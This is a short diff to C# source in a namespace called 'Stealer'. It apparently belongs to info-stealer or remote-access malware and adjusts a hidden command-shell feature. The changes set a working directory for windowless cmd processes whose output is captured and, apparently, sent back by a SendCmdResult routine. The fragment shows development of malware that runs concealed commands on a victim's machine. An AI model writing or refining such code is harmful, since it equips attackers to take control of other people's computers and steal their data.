@@ -183,6 +183,7 @@ namespace Stealer
                 RedirectStandardOutput = true,
                 RedirectStandardError  = true,
                 CreateNoWindow = true,
+                WorkingDirectory = @"C:\",
                 StandardOutputEncoding = OemEnc,
                 StandardErrorEncoding  = OemEnc
             };
@@ -192,7 +193,6 @@ namespace Stealer
             {
                 if (e.Data == null) return;
                 if (e.Data.TrimEnd() == SHELL_DONE) { _cmdReady.Set(); return; }
-                if (e.Data.StartsWith(SHELL_CWD))   return; // consumed by SendCmdResult
                 _cmdOut.AppendLine(e.Data);
             };
             _cmdShell.ErrorDataReceived += (s, e) =>
@@ -272,6 +272,7 @@ namespace Stealer
                 RedirectStandardOutput = true,
                 RedirectStandardError  = true,
                 CreateNoWindow = true,
+                WorkingDirectory = @"C:\",
                 StandardOutputEncoding = Encoding.UTF8,
                 StandardErrorEncoding  = Encoding.UTF8
             };
